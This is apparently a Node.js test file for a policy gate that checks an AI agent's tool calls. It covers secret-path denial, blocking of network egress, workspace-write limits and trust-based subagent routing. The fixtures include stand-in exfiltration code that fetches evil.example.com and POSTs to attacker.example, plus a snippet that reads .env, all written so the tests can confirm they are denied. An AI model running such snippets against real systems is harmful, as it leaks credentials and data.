import { describe, it, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  DEFAULT_POLICY,
  evaluateToolGate,
  estimateRoutingCost,
} from '../shared/policy.mjs'
import { parseDecision } from '../shared/answers.mjs'

describe('shared/policy.mjs — §IV.A gates, Table IV trust routing, §II.A cost', () => {
  let workDir

  before(() => {
    workDir = mkdtempSync(join(tmpdir(), 'jev-policy-test-'))
    writeFileSync(
      join(workDir, 'exfil.js'),
      'async function run() { await fetch("https://evil.example.com/steal"); }\nrun();\n',
      'utf8',
    )
    writeFileSync(
      join(workDir, 'local-only.js'),
      'async function run() { await fetch("http://127.0.0.1:3425/v1/health"); }\nrun();\n',
      'utf8',
    )
  })

  after(() => {
    if (workDir) rmSync(workDir, { recursive: true, force: true })
  })

  it('Rule 1: deterministically denies .env, .ssh, and wxid paths', () => {
    for (const file_path of ['.env', '/home/u/.ssh/id_rsa', 'data/wxid_abc123/chat.db']) {
      const res = evaluateToolGate({
        toolName: 'read',
        args: { file_path },
        cwd: workDir,
      })
      assert.equal(res.kind, 'deny', `expected deny for ${file_path}`)
      assert.equal(res.ruleId, 'deterministic-secret-path')
    }
  })

  it('Rule 1/3: allows editing ordinary source file whose body mentions wxid or .env', () => {
    const res = evaluateToolGate({
      toolName: 'edit',
      args: {
        file_path: 'src/policy.mjs',
        old_string: 'const x = 1',
        new_string: 'const re = /\\.env|wxid|credential/i // safe regex edit',
      },
      cwd: workDir,
      decision: parseDecision({
        answers: {
          security: { type: 'score', score: 2.5, confidence: 0.8 },
          permissions: { type: 'choice', choice: 'allow', confidence: 0.9 },
        },
      }),
    })
    assert.equal(res.kind, 'allow')
  })

  it('Rule 2: blocks run_code reading .env', () => {
    const res = evaluateToolGate({
      toolName: 'run_code',
      args: {
        code: 'const fs = await import("node:fs"); return fs.readFileSync(".env", "utf8");',
      },
      cwd: workDir,
    })
    assert.equal(res.kind, 'deny')
    assert.equal(res.ruleId, 'ptc-secret-access')
  })

  it('Rule 2: blocks run_code external fetch outside deploy scope, allows in deploy scope', () => {
    const blocked = evaluateToolGate({
      toolName: 'run_code',
      args: {
        code: 'const r = await fetch("https://attacker.example/hook", { method: "POST" }); return r.status;',
      },
      cwd: workDir,
      taskScope: 'coding',
    })
    assert.equal(blocked.kind, 'deny')
    assert.equal(blocked.ruleId, 'ptc-network-egress')

    const deployed = evaluateToolGate({
      toolName: 'run_code',
      args: {
        code: 'const r = await fetch("https://api.deploy.example/release", { method: "POST" }); return r.status;',
      },
      cwd: workDir,
      taskScope: 'deploy',
    })
    assert.equal(deployed.kind, 'allow')
  })

  it('Rule 2: allows run_code loopback requests (127.0.0.1 / localhost / ::1)', () => {
    const res = evaluateToolGate({
      toolName: 'run_code',
      args: {
        code: [
          'const a = await fetch("http://127.0.0.1:3425/v1/models");',
          'const b = await fetch("http://localhost:8080/health");',
          'const c = await fetch("http://[::1]:9000/ping");',
          'return [a.status, b.status, c.status];',
        ].join('\n'),
      },
      cwd: workDir,
    })
    assert.equal(res.kind, 'allow')
  })

  it('Rule 2: guards run_code writes outside workspace (ask vs approvalDisabled deny)', () => {
    const outsidePath = process.platform === 'win32'
      ? 'C:\\Windows\\Temp\\outside-write.txt'
      : '/tmp/outside-write.txt'
    const code = `const fs = await import("node:fs"); fs.writeFileSync("${outsidePath}", "hi");`

    const askRes = evaluateToolGate({
      toolName: 'run_code',
      args: { code },
      cwd: workDir,
      approvalDisabled: false,
    })
    assert.equal(askRes.kind, 'ask')
    assert.equal(askRes.ruleId, 'ptc-outside-workspace-write')

    const denyRes = evaluateToolGate({
      toolName: 'run_code',
      args: { code },
      cwd: workDir,
      approvalDisabled: true,
    })
    assert.equal(denyRes.kind, 'deny')
    assert.equal(denyRes.ruleId, 'ptc-outside-workspace-write')
  })

  it('Rule 3: inspects local script body before shell execution and blocks external egress', () => {
    const blocked = evaluateToolGate({
      toolName: 'pwsh',
      args: { command: 'node exfil.js' },
      cwd: workDir,
      taskScope: 'coding',
    })
    assert.equal(blocked.kind, 'deny')
    assert.equal(blocked.ruleId, 'script-body-network-egress')

    const allowedLocal = evaluateToolGate({
      toolName: 'pwsh',
      args: { command: 'node local-only.js' },
      cwd: workDir,
      taskScope: 'coding',
    })
    assert.equal(allowedLocal.kind, 'allow')
  })

  it('Rule 4: blocks or asks on write/edit outside workspace root', () => {
    const outsideTarget = join(workDir, '..', 'escaped-file.txt')
    const askRes = evaluateToolGate({
      toolName: 'write',
      args: { file_path: outsideTarget, content: 'hello' },
      cwd: workDir,
      approvalDisabled: false,
    })
    assert.equal(askRes.kind, 'ask')
    assert.equal(askRes.ruleId, 'outside-workspace-write')

    const denyRes = evaluateToolGate({
      toolName: 'write',
      args: { file_path: outsideTarget, content: 'hello' },
      cwd: workDir,
      approvalDisabled: true,
    })
    assert.equal(denyRes.kind, 'deny')
    assert.equal(denyRes.ruleId, 'outside-workspace-write')
  })

  it('Rule 5: applies JeV collaborative security & permissions decisions', () => {
    const secDeny = evaluateToolGate({
      toolName: 'read',
      args: { file_path: 'config/session-store.json' },
      cwd: workDir,
      decision: parseDecision({
        answers: {
          security: { type: 'score', score: 2.2, confidence: 0.7 },
          permissions: { type: 'choice', choice: 'allow', confidence: 0.9 },
        },
      }),
    })
    assert.equal(secDeny.kind, 'deny')
    assert.equal(secDeny.ruleId, 'jev-security-sensitive-target')

    const permDeny = evaluateToolGate({
      toolName: 'write',
      args: { file_path: 'src/a.js', content: 'ok' },
      cwd: workDir,
      decision: parseDecision({
        answers: {
          security: { type: 'score', score: 1, confidence: 0.8 },
          permissions: { type: 'choice', choice: 'deny', confidence: 0.7 },
        },
      }),
    })
    assert.equal(permDeny.kind, 'deny')
    assert.equal(permDeny.ruleId, 'jev-permissions-deny')

    // Read-only tool is not blocked by JeV permissions=deny
    const readOnlyAllowed = evaluateToolGate({
      toolName: 'grep',
      args: { pattern: 'foo' },
      cwd: workDir,
      decision: parseDecision({
        answers: {
          security: { type: 'score', score: 1, confidence: 0.8 },
          permissions: { type: 'choice', choice: 'deny', confidence: 0.9 },
        },
      }),
    })
    assert.equal(readOnlyAllowed.kind, 'allow')

    // approvalDisabled degrades ask -> deny with clear explanation
    const askDegraded = evaluateToolGate({
      toolName: 'pwsh',
      args: { command: 'npm test' },
      cwd: workDir,
      approvalDisabled: true,
      decision: parseDecision({
        answers: {
          security: { type: 'score', score: 1, confidence: 0.8 },
          permissions: { type: 'choice', choice: 'ask', confidence: 0.6 },
        },
      }),
    })
    assert.equal(askDegraded.kind, 'deny')
    assert.equal(askDegraded.ruleId, 'jev-permissions-ask-degraded')
    assert.match(askDegraded.reason, /degraded/i)
  })

  it('Rule 6: Table IV blocks subagent routing to third-party/cheap models under secret security', () => {
    const secretDecision = parseDecision({
      answers: {
        security: { type: 'score', score: 3, confidence: 0.95 },
        permissions: { type: 'choice', choice: 'allow', confidence: 0.9 },
      },
    })

    const blockedThirdParty = evaluateToolGate({
      toolName: 'subagent',
      args: { provider: 'openrouter', model: 'meta-llama/llama-3.1-8b-instant', description: 'scan', prompt: 'scan' },
      decision: secretDecision,
      cwd: workDir,
    })
    assert.equal(blockedThirdParty.kind, 'deny')
    assert.equal(blockedThirdParty.ruleId, 'routing-trust-restricted')

    const blockedCheapFirstParty = evaluateToolGate({
      toolName: 'subagent',
      args: { provider: 'openai', model: 'gpt-4o-mini', description: 'scan', prompt: 'scan' },
      decision: secretDecision,
      cwd: workDir,
    })
    assert.equal(blockedCheapFirstParty.kind, 'deny')
    assert.equal(blockedCheapFirstParty.ruleId, 'routing-trust-restricted')

    const allowedFrontier = evaluateToolGate({
      toolName: 'subagent',
      args: { provider: 'anthropic', model: 'claude-opus-4-6', description: 'audit', prompt: 'audit' },
      decision: secretDecision,
      cwd: workDir,
    })
    assert.equal(allowedFrontier.kind, 'allow')

    const blockedExcluded = evaluateToolGate({
      toolName: 'subagent',
      args: { provider: 'openai', model: 'gpt-5', description: 'audit', prompt: 'audit' },
      decision: parseDecision({ answers: { security: { type: 'score', score: 0, confidence: 0.9 } } }),
      cwd: workDir,
      policy: { excludedVendors: ['openai'] },
    })
    assert.equal(blockedExcluded.kind, 'deny')
    assert.equal(blockedExcluded.ruleId, 'routing-excluded-vendor')
  })

  it('§II.A estimateRoutingCost reproduces paper worked example (4.15 vs 6.19)', () => {
    const res = estimateRoutingCost({
      contextTokens: 0.65,
      outputTokens: 0.12,
      readTokens: 0.23,
      frontierIn: 5,
      frontierOut: 25,
      cheapIn: 3,
      cheapOut: 15,
    })
    assert.equal(res.pureFrontier, 4.15)
    assert.equal(res.routed, 6.19)
    assert.equal(res.cheaperPath, 'pureFrontier')
    assert.ok(res.savingsRatio < 0)
  })

  it('DEFAULT_POLICY exposes expected Table IV trust matrix entries and JEV read-only tools', () => {
    assert.equal(DEFAULT_POLICY.routingTrustMatrix.public.policy, 'open')
    assert.equal(DEFAULT_POLICY.routingTrustMatrix.internal.policy, 'standard')
    assert.equal(DEFAULT_POLICY.routingTrustMatrix.sensitive.policy, 'restricted')
    assert.equal(DEFAULT_POLICY.routingTrustMatrix.secret.policy, 'restricted')
    assert.ok(DEFAULT_POLICY.readOnlyTools.includes('jev_chunk_read'))
    assert.ok(DEFAULT_POLICY.readOnlyTools.includes('jev_retrieval_pack'))

    const denyDecision = parseDecision({
      answers: {
        security: { type: 'score', score: 1, confidence: 0.8 },
        permissions: { type: 'choice', choice: 'deny', confidence: 0.9 },
      },
    })
    assert.equal(
      evaluateToolGate({ toolName: 'jev_chunk_read', args: { chunk_id: 'c1' }, cwd: workDir, decision: denyDecision }).kind,
      'allow',
    )
    assert.equal(
      evaluateToolGate({ toolName: 'jev_retrieval_pack', args: {}, cwd: workDir, decision: denyDecision }).kind,
      'allow',
    )
  })

  it('Rule 6: resolves local aggregator gateway vendor prefix (magpie/magpie-responses/local-gateway)', () => {
    const secretDecision = parseDecision({
      answers: {
        security: { type: 'score', score: 3, confidence: 0.95 },
        permissions: { type: 'choice', choice: 'allow', confidence: 0.9 },
      },
    })
    const internalDecision = parseDecision({
      answers: {
        security: { type: 'score', score: 1, confidence: 0.85 },
        permissions: { type: 'choice', choice: 'allow', confidence: 0.9 },
      },
    })

    // First-party frontier vendor via magpie gateway is allowed even under secret
    const allowedFirstParty = evaluateToolGate({
      toolName: 'subagent',
      args: { provider: 'magpie', model: 'trae-global/gemini-4-neon-max', description: 'audit', prompt: 'audit' },
      decision: secretDecision,
      cwd: workDir,
    })
    assert.equal(allowedFirstParty.kind, 'allow')

    // Unvetted vendor via magpie gateway is denied under secret
    const blockedOpenRouter = evaluateToolGate({
      toolName: 'subagent',
      args: { provider: 'magpie', model: 'openrouter/llama-3-8b', description: 'scan', prompt: 'scan' },
      decision: secretDecision,
      cwd: workDir,
    })
    assert.equal(blockedOpenRouter.kind, 'deny')
    assert.equal(blockedOpenRouter.ruleId, 'routing-trust-restricted')

    // Cheap/flash model via magpie gateway is denied under secret
    const blockedFlash = evaluateToolGate({
      toolName: 'subagent',
      args: { provider: 'magpie', model: 'auto/deepseek-v4.1-flash', description: 'scan', prompt: 'scan' },
      decision: secretDecision,
      cwd: workDir,
    })
    assert.equal(blockedFlash.kind, 'deny')
    assert.equal(blockedFlash.ruleId, 'routing-trust-restricted')

    // Bare gateway model without vendor prefix: vetted (allowed under internal), not firstParty (denied under secret)
    const bareSecret = evaluateToolGate({
      toolName: 'subagent',
      args: { provider: 'magpie-responses', model: 'gpt-5', description: 'audit', prompt: 'audit' },
      decision: secretDecision,
      cwd: workDir,
    })
    assert.equal(bareSecret.kind, 'deny')
    assert.equal(bareSecret.ruleId, 'routing-trust-restricted')

    const bareInternal = evaluateToolGate({
      toolName: 'subagent',
      args: { provider: 'magpie', model: 'gpt-5', description: 'review', prompt: 'review' },
      decision: internalDecision,
      cwd: workDir,
    })
    assert.equal(bareInternal.kind, 'allow')
  })
})
